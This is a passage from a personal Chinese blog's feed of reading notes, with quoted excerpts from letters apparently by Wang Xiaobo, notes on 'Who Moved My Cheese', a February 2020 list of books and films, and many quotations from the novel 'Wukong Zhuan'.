title="永远“相思”你"></a>永远“相思”你</h3><ol><li>我天生不喜欢枯燥的一切，简直不能理解人们总爱把有趣的事情弄得干巴起来。我要活化生活，真的，活化它。要活就活一个够。  </li><li>我特别相信你。世界上好人不少，不过你是最重要的一个。你要是愿意，我就永远爱你，你要不愿意，我就永远相思。对了，永远“相思”你。  </li></ol><h3 id="我愿做你的菩提树"><a href="#我愿做你的菩提树" class="headerlink" title="我愿做你的菩提树"></a>我愿做你的菩提树</h3><ol><li>别怕美好的一切消失，咱们先来让它存在。  </li></ol><h3 id="你知道你有多好吗"><a href="#你知道你有多好吗" class="headerlink" title="你知道你有多好吗"></a>你知道你有多好吗</h3><ol><li>记得那是我们认识之初，有一次你对我说：有的人，是无价之宝。我是多么感动呵。对了，我常常这样想，谁把我放在心里的这种位置上，我才能把自己的一切给他。不能给一个不咸不淡的人，不能给一个不冷不热的人，不能给一个不死不活的人，因为他不配，他根本不配。我要爱，就要爱得热烈，爱得甜蜜，爱得永远爱不够。我凭什么要求这样的爱呢？因为我要使他得到一切，我要把我的全部身心、全部热情、全部灵魂，连带它的一切情绪、一切细微的变化、活动、感触，它的一切甜蜜、悲伤、绝望、挣扎、叹息，它的全部温柔、善良，它的全部高尚、渺小、优点、缺点都给他，还有我的愿望、幻想，一切、一切。  </li></ol><h3 id="爱情，爱情，灿烂如云"><a href="#爱情，爱情，灿烂如云" class="headerlink" title="爱情，爱情，灿烂如云"></a>爱情，爱情，灿烂如云</h3><ol><li>我不爱让人知道我是怎么想的，不过我永远不怕对任何人承认我爱你。  </li></ol><h3 id="爱情从来不说对不起"><a href="#爱情从来不说对不起" class="headerlink" title="爱情从来不说对不起"></a>爱情从来不说对不起</h3><ol><li>有人说：爱情从来不说对不起，也不说谢谢，你说是吗？原因就在于信任。一般人都能做到，更何况我们呢？  </li></ol><h3 id="致刘晓阳"><a href="#致刘晓阳" class="headerlink" title="致刘晓阳"></a>致刘晓阳</h3><ol><li>要用鲁迅的话来说，是拿大旗做虎皮。要用我的话来说，就是肚皮上割口子，假充二bi（第一声）。  </li><li>人在年轻时，觉得到处都是人，别人的事都是你的事，到了中年以后，才觉得世界上除了家人已经一无所有，自己的事都做不过来。以此类推，到了老年，必定觉得很孤独，还会觉得做什么都力不从心。换言之，年轻时是自由人，后来成了家庭的囚犯，最后成为待决的死囚。……  </li><li>×××是精英人物，免不了传统精英人物的毛病——一种牺牲别人、践踏别人，以达成自己目的的雄心。美国有位女权主义者说得好，这世界上有两种人，一种是fucker，一种是fuckee。精英总觉得自己是fucker，看别人都是fuckee，自己就该be top，别人就该be bottom。××说，让别人牺牲自己不能牺牲，就是种top意识——她现在嫁了人，当了bottom，可能会有些改变。所以也不能苛责年轻时的×××。  </li><li>我们做男同性恋调查，得知圈内人士都以“be bottom”为莫大的幸福。只有追求别人时，为了赢得别人欢心才作top。但他们嘴头上都说自己是作top的，用圈里人的话来说，死要面子活受罪。  </li><li>更何况人在自由之中，容易看到自由的弊病，体会不到自由的好处，很多人不由自主做了国家主义的帮凶：这就叫一叶障目，不见泰山罢。实际上知识分子活在世上，除自由主义外，无它种立场可取。  </li><li>生日快乐！我也快过生日了，但不快乐。过一年少一年。  </li></ol><h3 id="致许倬云"><a href="#致许倬云" class="headerlink" title="致许倬云"></a>致许倬云</h3><ol><li>但生活就是如此，又何须掩饰？我们虽然过得不很好，也是一样一步步走过来，直到今日。对于我来说，再没有比这更值得珍惜的事了。  </li></ol><h3 id="致陈少平"><a href="#致陈少平" class="headerlink" title="致陈少平"></a>致陈少平</h3><ol><li>似乎没有必要为别人的愚蠢而震惊愤怒或欢欣鼓舞。那是他们的事。我亦相信中国将有一独立的知识界，不被政治风向所左右。况且艺术本身也是可以不被环境左右的。  </li><li>艺术只是人的感受与不同的表达方式。故而艺术需要一种伟大的真诚，为中国人所缺少者。  </li></ol><h3 id="致艾晓明"><a href="#致艾晓明" class="headerlink" title="致艾晓明"></a>致艾晓明</h3><ol><li>维纳曾说，艺术家、科学家与棋手不同，棋手的成败取决于在一局中有无败着，也就是说，他的成就取决于他的最坏状态。艺术家是反棋手，一切取决于他的最好状态。其实不用维纳说，我们也是这样看待自己：我们是休眠中的火山、是冬眠的眼镜蛇，或者说，是一颗定时炸弹，等待自己的最好时机。也许这个最好时机还没有到来，所以只好继续等待着。在此之前，万万不可把自己看轻了。但我现在开始怀疑自己还有没有更好的时机。不管怎样，也要拼命地写。结果是患了痔疮。所以，不久的将来，我也要允许自己休眠一个时期了。  </li><li>口诛笔伐地用理念来反对平庸，并不是有效的反对方法。一个小说的作者，似乎该用作品的丰富多彩、惊世骇俗来反对平庸。很直露地把这种不满写出来没有力量。  </li><li>我当然以为平庸无所不在，是一种世界性的现象。但你该想出点不平庸的事来说说，不能总说：我反对。所谓临渊羡鱼不如退而结网，就是这个道理。艺术里总得有点“运用之妙存乎一心”的东西，不只是正确的方法和态度。当然，假如你说昆德拉的书不是小说是哲学，我倒看不出什么不足之处，但恐怕真正的哲学家就会起而攻击，嫌他不够严肃了。  </li><li>在我们这里，假如谁要奉献一点可观的东西，就需要冷静而睿智，同时在内心深处彻头彻尾的疯狂。这可不那么容易。<br>…………  </li><li>其坐而论道，不如率性而行。  </li><li>艺术不是一种社会伦理，无需人们的共识，只需要欣赏者的如醉如痴。  </li></ol><h3 id="致魏心宏"><a href="#致魏心宏" class="headerlink" title="致魏心宏"></a>致魏心宏</h3><ol><li>我觉得所有的作家分成两类，一类在解释自己，另一类在另外开拓世界。前一类作家写的一切，其实是广义的个人经历，如海明威；而后一类作家主要是凭借想象力来营造一些什么，比如卡尔维诺、尤瑟娜尔等人。  </li></ol><h3 id="致曲小燕"><a href="#致曲小燕" class="headerlink" title="致曲小燕"></a>致曲小燕</h3><ol><li>既然×反对信息时代，我们就不进这个时代罢，有什么法子。所以还是写信好了。  </li><li>求学这件事，持之以恒固然好，但兴之所至就更好。  </li></ol><h3 id="致刘怀昭"><a href="#致刘怀昭" class="headerlink" title="致刘怀昭"></a>致刘怀昭</h3><ol><li>假如你相信智慧是好的，就应该从善如流，不该反过来问智慧有何用处。知识分子比较聪明，不是知识分子的人则比较笨，这该是不争的事实。  </li></ol><h3 id="致沈昌文"><a href="#致沈昌文" class="headerlink" title="致沈昌文"></a>致沈昌文</h3><ol><li>我们夫妇素来麻木不仁，听到这个消息也惊诧不已。  </li></ol><h3 id="致柯云路"><a href="#致柯云路" class="headerlink" title="致柯云路"></a>致柯云路</h3><ol><li>自近代以来，科学有很大的成绩，任何人想要有所创新，总要从学习开始。  </li></ol>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《谁动了我的奶酪》 斯宾塞·约翰逊</title>
      <link href="/2020/reading-note/%E3%80%8A%E8%B0%81%E5%8A%A8%E4%BA%86%E6%88%91%E7%9A%84%E5%A5%B6%E9%85%AA%E3%80%8B%20%E6%96%AF%E5%AE%BE%E5%A1%9E%C2%B7%E7%BA%A6%E7%BF%B0%E9%80%8A/"/>
      <url>/2020/reading-note/%E3%80%8A%E8%B0%81%E5%8A%A8%E4%BA%86%E6%88%91%E7%9A%84%E5%A5%B6%E9%85%AA%E3%80%8B%20%E6%96%AF%E5%AE%BE%E5%A1%9E%C2%B7%E7%BA%A6%E7%BF%B0%E9%80%8A/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E3%80%8A%E8%B0%81%E5%8A%A8%E4%BA%86%E6%88%91%E7%9A%84%E5%A5%B6%E9%85%AA%E3%80%8B.jpg" alt="封面" loading="lazy"></p><h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h2><a id="more"></a>  <h3 id="中文版序言"><a href="#中文版序言" class="headerlink" title="中文版序言"></a>中文版序言</h3><ol><li>因为最有价值的不是故事本身，而是大家对它的理解与应用。  </li></ol><h3 id="“谁动了我的奶酪”现象"><a href="#“谁动了我的奶酪”现象" class="headerlink" title="“谁动了我的奶酪”现象"></a>“谁动了我的奶酪”现象</h3><ol><li>再完美的计划也时常遭遇不测。——罗伯特·彭斯  </li></ol><h3 id="我们多面的人性"><a href="#我们多面的人性" class="headerlink" title="我们多面的人性"></a>我们多面的人性</h3><ol><li>在迷宫中找到出路，从而在这个变幻莫测的时代品味成功。  </li></ol><h3 id="故事背后的故事"><a href="#故事背后的故事" class="headerlink" title="故事背后的故事"></a>故事背后的故事</h3><ol><li>当变化出现时，或许简单行事能比瞻前顾后带来更多的快乐和收益。  </li></ol><h3 id="芝加哥的同学聚会"><a href="#芝加哥的同学聚会" class="headerlink" title="芝加哥的同学聚会"></a>芝加哥的同学聚会</h3><ol><li>使我不再认为变化意味着失去现有的一切，相反，变化意味着赢得未来。  </li></ol><h3 id="“谁动了我的奶酪”的故事"><a href="#“谁动了我的奶酪”的故事" class="headerlink" title="“谁动了我的奶酪”的故事"></a>“谁动了我的奶酪”的故事</h3><ol><li>自己害怕的是独自一人前行。唧唧的速度越来越慢，这正是因为恐惧的思绪压倒了他，不过他自己还没有意识到这一点。  </li><li>唧唧现在已经不再考虑自己会失去什么，而是考虑自己会有什么新的收获。自己当初怎么总是认为改变是坏事呢，唧唧有些纳闷儿。现在，他已经意识到，变化带来的也可能是好事。  </li><li>你可能认为变化会伤害你，所以抵制它，坚决不接受变化。或者你认为找到新的奶酪对你有益，所以你会热烈欢迎变化。这一切，都取决于你的观念。  </li><li>在学会嘲笑自己和自己所做的傻事之后。他意识到，改变自己最快捷的方式就是嘲笑自己的愚蠢，这样才能对自己的过去释然，从而迅速朝着新方向前进。  </li><li>他们把生活看得很简单，从来不会像自己和哼哼那样没完没了地分析。  </li><li>变化的外表下隐藏的是福祉  </li><li>哼哼必须独自克服贪图安逸和恐惧的心理，自己去寻找前进的道路，这个过程是没有人能够代替他，或者说服他的。他必须通过自身的体验来明白变化的好处才行  </li><li>他知道，给自己找到更多的机会比在安乐窝里不问世事要安全得多。  </li><li>随着奶酪的变化而变化，并且享受变化！  </li></ol><h3 id="下午茶时的讨论"><a href="#下午茶时的讨论" class="headerlink" title="下午茶时的讨论"></a>下午茶时的讨论</h3><ol><li>如果不再恐惧，你会做什么？  </li><li>变化无处不在，迅速适应可以使我们占得先机。  </li><li>应该做的是领导变革，而非应对目前的局面。  </li></ol><h2 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h2><p>其实久闻大名，但看完之后，就觉得一般般。<br>在看序的时候，觉得这本书被吹的天花乱坠，简直是人生不得不看的书啊。<br>可看完之后，就觉得不过如此。<br>没错。<br>道理我们都懂，可不一定去做，就算看了这么个小故事，也觉得没什么惊艳到的地方。<br>可能是因为现在我还只是个大学生吧，对社会、对生活也没什么了解。<br>几年之后，可能会有变化。  </p>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2月小结</title>
      <link href="/2020/reading-note/2%E6%9C%88%E5%B0%8F%E7%BB%93/"/>
      <url>/2020/reading-note/2%E6%9C%88%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="总记"><a href="#总记" class="headerlink" title="总记"></a>总记</h2><p>2月份是我开始下定决心要好好读书的时候，因为疫情，让我拾起了放弃了多年的读书习惯，也算是顿悟了一丢丢吧。<br>下面就记录一下2020.2月看过的所有书。</p><a id="more"></a><h2 id="书籍"><a href="#书籍" class="headerlink" title="书籍"></a>书籍</h2><ol><li>1984</li><li>动物农场</li><li>牧羊少年奇幻之旅</li><li>苏菲的世界</li><li>芳华</li><li>悟空传</li><li>1Q84<br>共7本书<h2 id="电影"><a href="#电影" class="headerlink" title="电影"></a>电影</h2></li><li>当幸福来敲门</li><li>唐顿庄园</li><li>疯狂动物园</li><li>中国机长</li><li>烈火英雄</li><li>超能陆战队</li><li>寻梦环游记</li><li>英国病人</li><li>魔女宅急便<br>共9部电影</li></ol>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《悟空传》 今何在</title>
      <link href="/2020/reading-note/%E3%80%8A%E6%82%9F%E7%A9%BA%E4%BC%A0%E3%80%8B%20%E4%BB%8A%E4%BD%95%E5%9C%A8/"/>
      <url>/2020/reading-note/%E3%80%8A%E6%82%9F%E7%A9%BA%E4%BC%A0%E3%80%8B%20%E4%BB%8A%E4%BD%95%E5%9C%A8/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E3%80%8A%E6%82%9F%E7%A9%BA%E4%BC%A0%E3%80%8B.jpg" alt="封面" loading="lazy"></p><h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h2><a id="more"></a>  <h3 id="版权信息"><a href="#版权信息" class="headerlink" title="版权信息"></a>版权信息</h3><ol><li>命运是大海，当你能够畅游时，你就要纵情游向你的所爱，因为你不知道狂流什么时候会到来，卷走一切希望与梦想  </li></ol><h3 id="【04-】"><a href="#【04-】" class="headerlink" title="【04.】"></a>【04.】</h3><ol><li>恨不死的阿弥陀，负尽千重罪，炼就不死心。  </li></ol><h3 id="【11-】"><a href="#【11-】" class="headerlink" title="【11.】"></a>【11.】</h3><ol><li>人又何尝不是一样？他们的生死也不过是因为神的需要罢了。神要从万物的灵蕴中吸取能量，若是世间没有活物了，神也会枯萎消亡。灵魂是种子，人是庄稼，神种下这些种子，然后让他们长大，产生欲望，去争斗，去爱恋，因为欲望而痛苦，痛苦就会祈求神灵，就会愿意把自己的一切供奉，所以神才成为神。如果没有人，神又有什么优越的？正因为做人如此痛苦，神才受人景仰。正因为人的卑微，神才高高在上。正如在鸡犬的眼中，人也是神，也可以主宰它们的命运一样。”  </li></ol><h3 id="【15-】"><a href="#【15-】" class="headerlink" title="【15.】"></a>【15.】</h3><ol><li>你入我眼，如花映水中，便不是花，色本是空，万物皆为红尘。  </li></ol><h3 id="【16-】"><a href="#【16-】" class="headerlink" title="【16.】"></a>【16.】</h3><ol><li>我要这天，再遮不住我眼，要这地，再埋不了我心，要这众生，都明白我意，要那诸佛，都烟消云散！  </li></ol><h3 id="【17-】"><a href="#【17-】" class="headerlink" title="【17.】"></a>【17.】</h3><ol><li>道法法不可道，问心心无可问，悟者便成天地，空来自在其中。  </li></ol><h3 id="【18-】"><a href="#【18-】" class="headerlink" title="【18.】"></a>【18.】</h3><ol><li>原来一生一世那么短暂，原来当你发现所爱的，就应该不顾一切地去追求。因为生命随时都会终止，命运是大海，当你能够畅游时，你就要纵情游向你的所爱，因为你不知道狂流什么时候会到来，卷走一切希望与梦想。  </li></ol><h3 id="【19-】"><a href="#【19-】" class="headerlink" title="【19.】"></a>【19.】</h3><ol><li>他不能停下，那意味着失败，屈辱的失败。他宁愿一直战斗到死。  </li></ol><h3 id="【21-】"><a href="#【21-】" class="headerlink" title="【21.】"></a>【21.】</h3><ol><li>也许每个人出生时都以为这天地是为他一个人而存在的，当他发现自己错的时候，他便开始长大了。  </li></ol><h3 id="【23-】"><a href="#【23-】" class="headerlink" title="【23.】"></a>【23.】</h3><ol><li>世界是这个样子的吗？极目之处，无边无界，我却不能再前进一步？  </li></ol><h3 id="【24-】"><a href="#【24-】" class="headerlink" title="【24.】"></a>【24.】</h3><ol><li>你在树上，一刻也不敢睡死，随时注意着不寻常的声响，你会担心，一睁眼的时候会看见一张血盆大口，你的身体随时都准备弹起来逃命或搏斗，每一个晚上都那么地长。直到天边的微光照到你的眼皮上，你会想谢天谢地你又多活了一个晚上，为了你又赚到的一天，在这个白天你要尽情地蹦跳、狂叫，把所有能找到的吃的塞进嘴里，但是夜晚很快又来了，你甚至还来不及找到一个朋友。你会想你受够了！但是你却不能不活着，你恐惧着生，却又恐惧着死，你不知道你每天为什么这样活着，哦……现在你知道了，我为什么要做神仙！  </li></ol><h3 id="【25-】"><a href="#【25-】" class="headerlink" title="【25.】"></a>【25.】</h3><ol><li>“总比死了强。”“不，大王。有些人宁愿死，也不想卑贱地乞讨生存。”  </li><li>“也许，在每个人的心里都会有一个天宫，有一片黑暗，在那片黑暗的深处，会有一片水面，里面映出他心的影子，灵魂就居住在那里。可是当一个人决定变成一个神，他就必须抛弃这些，他要让那水里什么也没有，什么也看不见，一片空寂之时，他就成仙了。可是，他心里是空空的，那是什么滋味？你知道吗？你……”  </li><li>晚霞的绚丽是不会久的，灿烂过后，便是漫漫的黑暗了。  </li></ol><h3 id="【27-】"><a href="#【27-】" class="headerlink" title="【27.】"></a>【27.】</h3><ol><li>我爱你。我却总是沉默。我不会让任何人伤害你。即使我从未开言。这是我的许诺，寂静无声。你无须知晓。它只在我心。  </li><li>我知道天会愤怒。如果人触犯了它的威严。但天是否知道人也会愤怒？如果他已一无所有。当我乞求时，你傲慢冷笑。当我痛哭时，你无动于衷。现在我愤怒了。我要听到天的痛哭，我要听到神的乞求。我知道天会愤怒，但你知道天也会颤抖吗？苍穹动摇时，我放声大笑，挥开如意金箍棒，打它个地覆天也翻。从今往后一万年，你们都会记住我的名字，齐天大圣孙悟空。  </li></ol><h3 id="【28-】"><a href="#【28-】" class="headerlink" title="【28.】"></a>【28.】</h3><ol><li>这个天地，我来过，我奋战过，我深爱过，我不在乎结局。  </li></ol><h3 id="【31-】"><a href="#【31-】" class="headerlink" title="【31.】"></a>【31.】</h3><ol><li>待至英雄们在铁铸的摇篮中长成，勇敢的心像从前一样，去造访万能的神祇。而在这之前，我却常感到，与其孤身跋涉，不如安然沉睡。  </li></ol><h3 id="【32-】"><a href="#【32-】" class="headerlink" title="【32.】"></a>【32.】</h3><ol><li>那时候我才明白，为什么那些妖精愿意在地上挨饿，因为没有人对他们说‘赐’字，他们也不靠‘赐’活着……”  </li></ol><h3 id="【33-】"><a href="#【33-】" class="headerlink" title="【33.】"></a>【33.】</h3><ol><li>五百年很漫长吗？记得，忘了，或许没那么重要。因为再重逢时，我们仍然会相爱。  </li></ol><h3 id="【34-】"><a href="#【34-】" class="headerlink" title="【34.】"></a>【34.】</h3><ol><li>只有绝望，能毁灭一颗不死的心。  </li></ol><h3 id="【37-】"><a href="#【37-】" class="headerlink" title="【37.】"></a>【37.】</h3><ol><li>“孙悟空！”有人叫。“不能应……会被葫芦吸进去的。”“啊？行者孙也照吸？”“哼哼，只要人心中抛不下自己，就会被我的法术所制的……”金角笑着说。  </li></ol><h3 id="【39-】"><a href="#【39-】" class="headerlink" title="【39.】"></a>【39.】</h3><ol><li>“俺老妈把俺生下来时，也没告诉俺猪一生的意义是什么。俺正在苦想，一看其他兄弟都先抢着把奶头占光了，才知道什么叫真他妈蠢！”  </li></ol><h3 id="【41-】"><a href="#【41-】" class="headerlink" title="【41.】"></a>【41.】</h3><ol><li>“可是我走的路，不一定是你走的啊？”  </li></ol><h3 id="【42-】"><a href="#【42-】" class="headerlink" title="【42.】"></a>【42.】</h3><ol><li>黑暗没有边界，他自己也没有了边界，他的触觉一直伸展，无边伸展，可触到的只是虚无。  </li><li>生我何用？不能欢笑。灭我何用？不减狂骄。  </li><li>你是要求道，还等道来见你吗？  </li><li>若知万物运行之法，便知未来是永不可去算知的。  </li><li>人只为自己解脱，却不能算得正果。这一路上，我看到众生心中懵懂一片，丢不下个爱恨痴缠，苦也由之，乐也从之，却总是一个欲字。我佛劝人清心忘欲，可生由空而生，又教之向空而去，不过是教来者向来处去。苍生之于世间，如落叶纷纷向大地，生生不息，何需导引，也许还有别的真义。  </li><li>鸿蒙初辟原无姓，打破顽冥须悟空。  </li><li>我终不能改变那个开始，何不忘了那个结局呢？  </li></ol><h3 id="【43-】"><a href="#【43-】" class="headerlink" title="【43.】"></a>【43.】</h3><ol><li>“我为真义！”金蝉子跳起脚来，“你明白了他的意思，你为你悟而笑，却忘了那天下千万笑不出之人！”  </li></ol><h3 id="【45-】"><a href="#【45-】" class="headerlink" title="【45.】"></a>【45.】</h3><ol><li>要去做的事，无法逃避。  </li><li>为什么要让一个已无力作为的人去看他少年时的理想？  </li></ol><h3 id="【48-】"><a href="#【48-】" class="headerlink" title="【48.】"></a>【48.】</h3><ol><li>然而，在神的字典里，所谓“解脱”，不过就是死亡；所谓“正果”，不过就是幻灭；所谓“成佛”，不过就是放弃所有的爱与理想，变成一座没有灵魂的塑像。  </li></ol><h3 id="【49-】"><a href="#【49-】" class="headerlink" title="【49.】"></a>【49.】</h3><ol><li>当五百年的光阴只是一个骗局，虚无时间中的人物又为什么而苦，为什么而喜呢？  </li></ol><h3 id="【50-】"><a href="#【50-】" class="headerlink" title="【50.】"></a>【50.】</h3><ol><li>这个天地，我来过，我奋战过，我深爱过，我不在乎结局。  </li></ol><h3 id="【01-】"><a href="#【01-】" class="headerlink" title="【01.】"></a>【01.】</h3><ol><li>我只要想一想，自然就醉了。长夜漫漫，太清醒不是会很难受？  </li></ol><h3 id="【02-】"><a href="#【02-】" class="headerlink" title="【02.】"></a>【02.】</h3><ol><li>“当年我把猴子从山底挖出来的时候，他有泥土恐惧症，最大的愿望就是脚不沾地在树上挂着，我用了三个月逼他重新拿出勇气在地上走路。“一年后，我遇上了一只自卑的猪，那时候他正在痛苦，一个小姑娘疯狂地想嫁给他，想和他一起去做妖精，而他只喜欢对着月亮流口水。为了逃跑，就混进了我们之中。“后来我在河里救起了沙僧，这个可怜的家伙五百年都没有学会游泳，可是天帝罚他在流沙河里当妖精，他就不敢在河岸上待着，只好在河中心的一块石头上站了五百年。”“而现在他们每一个人都恨我。”唐僧叹了一口气，“如果我死了，他们就会解脱吧。”  </li></ol><h3 id="【03-】"><a href="#【03-】" class="headerlink" title="【03.】"></a>【03.】</h3><ol><li>“这个世界上本来是没有路的，因为有人要到他想去的地方，所以他们需要一条路，其实路通向哪儿也没关系。”  </li></ol><h3 id="【04-】-1"><a href="#【04-】-1" class="headerlink" title="【04.】"></a>【04.】</h3><ol><li>因为……这世上没有什么能永远不失去，可有些人不相信这些，所以他们失去的，他们要不停地找回来，找一辈子。  </li><li>这个世界上，有些人是没有地方可去的，他们是流放者，你让他们回去，他们找不到来时的路，找不到过去的家园，就会死在某一个角落。  </li><li>“我看这儿要沉了，神的力量你们是无法抗拒的，妖族永远也掌握不了这么大的力量。”“是的，我们总是自然的顺从者，我们在海水、泥土、落叶中而生，不会想到要控制天地的力量，把风雨雷电据为己用。但我们并不是没有令人畏惧的力量，我们……”  </li></ol><h3 id="【05-】"><a href="#【05-】" class="headerlink" title="【05.】"></a>【05.】</h3><ol><li>这个世界有你不能到达的地方，有你不应到达的地方，有你一辈子也不会到达的地方，你的世界并不如你想象的那么大。界限也许就在你身边，可你却以为你可以去任何地方。  </li></ol><h3 id="【06-】"><a href="#【06-】" class="headerlink" title="【06.】"></a>【06.】</h3><ol><li>“可是玉帝如果不在了，天宫就会瓦解。不要忘了，众神不是为了凡人而存在的，人间不过是托起天界的平台而已。”飞过的胃土雉对他说。  </li></ol><h3 id="【07-】"><a href="#【07-】" class="headerlink" title="【07.】"></a>【07.】</h3><ol><li>你也有心上人吧，他何等有幸见你那会心一笑时，那才是天下最美。  </li><li>你哭吧，我知道你心里不好受，你受了那么多苦，没有人说，没有人帮你，那么多人想害你，想看着你死，我也想害你。你一个人，对着整个天地，又不能放弃，不能输，又没有回头路  </li></ol><h3 id="【08-】"><a href="#【08-】" class="headerlink" title="【08.】"></a>【08.】</h3><ol><li>“孙悟空绝不可以成佛！那一天，世界将没有任何希望。”  </li><li>我们看着噩梦一点点地发生，却永远醒不过来。  </li></ol><h3 id="【09-】"><a href="#【09-】" class="headerlink" title="【09.】"></a>【09.】</h3><ol><li>我只有一颗心，我只是在路上看到了不同的风景，看到来自不同源头的人们所构造的自己的世界。这个世界是混沌的，但当有人说他发现了世界的本源，发现了万变不离其宗的真相，他便成了指引者，而当他的宗法被铸成铁卷不可动摇，世界便有了界限，成了囚笼。  </li><li>五百年，很多东西沉埋了，再过五万年，就不会有人记起，但它们还在，记录着当年的光线与光线所照过的人。你把它挖出来，它会告诉你一个故事。你觉得它很可笑，因为你看见了历史，原来它和你想的那么不一样。你不知道是该相信光，还是相信黑暗的岩石。五百年了，五百年不见阳光的岁月，所有的人都欲言又止，每个人都知道你的过去，他们认为你不应该是你。而你知道你就是你自己，从来也没有改变过。改变的，是世道与人心吧。  </li></ol><h3 id="【10-】"><a href="#【10-】" class="headerlink" title="【10.】"></a>【10.】</h3><ol><li>如果你能顺从这种规律，该吃的时候吃，该被吃的时候被吃，你就同他们一样。他们在兵乱和瘟疫中死生，同样没有反抗的气力，我们反抗不了人，人也反抗不了神，我们不过是这个世界的无数精巧设计中的零件，一个推动另一个，无休止地转动着，没有区别。你懂得越多，你就越明白你操纵不了它的运作，越明白自己是多么渺小无力。从这一点说，猪比人伟大。”  </li></ol><h3 id="【11-】-1"><a href="#【11-】-1" class="headerlink" title="【11.】"></a>【11.】</h3><ol><li>不断地寻找痛苦，比我更深的痛苦。这样我就知足，就宽心，就领悟神的力量，他使追求越多的人越痛苦，而安卧于他脚下的人得极乐。  </li><li>可这世上，能达极乐者又有几人？我若自度，却弃不下尘世众生。我若度人，自己便永不能极乐，所以我永世到不了西天的！  </li></ol><h3 id="【12-】"><a href="#【12-】" class="headerlink" title="【12.】"></a>【12.】</h3><ol><li>只因心高嫌地窄，立心端要破瑶天！  </li><li>人生难道不是梦幻吗？你所得的你最终全会失去，你认为那是真的，你就会痛苦，而你知道那不过是一个游戏一场梦境，你就能解脱。人生在世，百年也好，千万年也好，都是未来前的一瞬，这一瞬后你什么都没有，你曾有的只有你自己。你在这世上永远地孤寂着，永远找不到能依托你心的东西，除非你放弃自己，融入造物之中，成为万重宇宙中一点尘埃。你就安乐了。  </li></ol><h3 id="【13-】"><a href="#【13-】" class="headerlink" title="【13.】"></a>【13.】</h3><ol><li>生命是苦役，是忧愁，快乐永远是短暂的，一瞬的快乐后你会陷入更长久的苦闷，因为你无法让美好驻留。因为你目睹花儿只能开放一次。  </li></ol><h3 id="第三卷-花果山"><a href="#第三卷-花果山" class="headerlink" title="第三卷 花果山"></a>第三卷 花果山</h3><ol><li>传说山外的大海中有不死的神龙，但他们大多数时间孤独地沉在海底。纵然你可以留得住自己，你却留不住你身边的东西，看着身边所有的东西都改变了，只剩下自己，那种无法承受的沉重是时间，没有人能承受那种重量。  </li></ol><h3 id="【03-】-1"><a href="#【03-】-1" class="headerlink" title="【03.】"></a>【03.】</h3><ol><li>猴子站了起来，看着天上：“它们既然在那里，是能触摸的东西，就真的没有人能碰到它们？真的永远不可及？如果一个地方是永远不可到达的，那个地方还存在吗？我们来到这个世界上，却知道有永远不可能碰到的东西，永远不可能做到的事，一想到这个，我就悲伤。”  </li></ol><h3 id="【04-】-2"><a href="#【04-】-2" class="headerlink" title="【04.】"></a>【04.】</h3><ol><li>我也时常幻想着有一个地方可以没有任何的危险，可以不用做自己不愿做的事也能快乐地生活。但好像没有人能做到这一点。  </li></ol><h3 id="【05-】-1"><a href="#【05-】-1" class="headerlink" title="【05.】"></a>【05.】</h3><ol><li>为了这短暂的时光，你要尽力地去抓住你所遇见的。要知你生命中所出现的，都是在漫长的时光中来到你面前的，去珍惜它们吧，孩子。  </li></ol><h3 id="【06-】-1"><a href="#【06-】-1" class="headerlink" title="【06.】"></a>【06.】</h3><ol><li>我们都会长大的，那时我们就更漂亮了。虽然那漫长的旅途中我们会变得衰老，但为了那生命中最绚丽的年华，我们都会不后悔地奔向那一刻的，是吗？  </li></ol><h3 id="【07-】-1"><a href="#【07-】-1" class="headerlink" title="【07.】"></a>【07.】</h3><ol><li>我不知道为什么要因为失去而忧伤，为什么为了时光短暂而忧愁。我要去找到那力量，让所有的生命都超越界限，让所有的花同时在大地上开放，让想飞的就能自由飞翔，让所有人和他们喜欢的永远地在一起。  </li></ol><h3 id="【04-】-3"><a href="#【04-】-3" class="headerlink" title="【04.】"></a>【04.】</h3><ol><li>比别人知道得更多原来是种痛苦，但是装不知道一样可能很痛苦。<br>杨戬能看到很多别人看不到的东西，包括人心的颜色。<br>人的心有很多颜色，红心、绿心、紫心、黑心，还有花心。<br>大部分的人是不纯净的，里面的颜色像极光一样变幻着。  </li></ol><h3 id="【06-】-2"><a href="#【06-】-2" class="headerlink" title="【06.】"></a>【06.】</h3><ol><li>求他们作甚，这时始知神仙是无信无义了。我等本自在山林，与世无争，偏逢天神召唤，要我们为祸商朝。我等按神仙意旨行了，结果事了神仙们一副慈善面孔，全不管他们作了多少恶，手上沾了多少血，尽全然推到我们妖精身上便了。莫要哭，死便死，却咒这周朝将来也重蹈商朝之辙，出个无道昏君，爱上位美人儿，惹怒天下诸侯，战乱百年。更愿那五百年后，出个天命也管束不了的人物，打上天庭，使众神魂飞魄散，那时天下的冤屈都得报偿，那时天下的众生都会狂笑！  </li></ol><h3 id="【08-】-1"><a href="#【08-】-1" class="headerlink" title="【08.】"></a>【08.】</h3><ol><li>正如若是命由天定，杨戬、杨婵的父母也根本不可能相遇，可见这世上事，神仙也是料不到的。  </li><li>人情洞察皆学问，嬉怒笑骂即文章。天下熙熙功名道，百无一用蠹书箱。先骂天昏无光亮，再怒善恶不得偿。神龛众偶心如铁，枉受香火在一方！  </li><li>如果这就是幸福，我这十几年来又是为了什么？”<br>“你为你的梦而努力过了，你尽力了。结果是不能强求的。”<br>“可是……如果没有结果，一切又有什么意义？”  </li></ol><h3 id="【09-】-1"><a href="#【09-】-1" class="headerlink" title="【09.】"></a>【09.】</h3><ol><li>刚才我看着白云苍狗，光阴流转，突然想明白了，人生如白驹过隙，岂有时光流连？与其怨恨过往，不如珍惜眼前。  